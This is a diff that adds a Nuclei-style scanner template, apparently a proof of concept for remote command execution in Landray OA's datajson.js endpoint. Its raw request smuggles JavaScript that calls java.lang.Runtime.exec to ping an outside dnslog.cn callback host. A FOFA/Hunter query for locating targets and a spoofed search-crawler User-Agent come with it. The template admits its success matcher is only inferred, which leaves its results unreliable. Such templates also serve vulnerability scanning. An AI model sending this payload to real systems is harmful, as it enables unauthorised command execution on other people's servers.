@@ -1,0 +1,35 @@
+id: poc-d470a8aa5ab9f2f922f0
+info:
+  name: 蓝凌OAEKPdatajson存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/d470a8aa5ab9f2f922f0a688dbb7b682
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: d470a8aa5ab9f2f922f0a688dbb7b682
+    fofa: + hunter`app.name="Landray 蓝凌OA"`
+http:
+- raw:
+  - 'GET /data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test()%7B%20return%20java.lang.Runtime%7D;r=test();r.getRuntime().exec(%22ping%20-c%204%205vfzyo.dnslog.cn%22)&type=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Pragma: no-cache
+
+    Accept-Encoding: gzip
+
+    User-Agent: Mozilla/5.0 (compatible; Baiduspider/2.0; http://www.baidu.com/search/spider.html)
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cache-Control: no-cache'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
